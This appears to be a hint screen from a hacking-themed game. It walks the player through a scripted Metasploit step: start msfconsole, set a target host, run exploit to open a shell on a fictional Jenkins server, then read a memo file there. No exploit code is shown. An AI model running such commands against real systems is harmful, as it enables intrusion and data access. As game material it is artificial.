HINT -- phase 3 (msfconsole)
══════════════════════════════════════════════════════════════════

THE FOUR COMMANDS
─────────────────
Module and callback are preloaded. Type the following in the
terminal, one line at a time:

    msfconsole
    set RHOSTS 10.4.12.1
    exploit
    cat /mnt/exec/ic-memo.txt

WHAT YOU'LL SEE
───────────────
After `exploit`: "Command shell session 1 opened" and the prompt
goes blank. You're on the Jenkins box.

After `cat /mnt/exec/ic-memo.txt`: the payoff plays. Press Enter
through three screens (memo, analysis, debrief). No flag to type;
the game advances on its own.

When it drops you back at the m0usunet prompt, type `continue`
to leave and report to HQ.
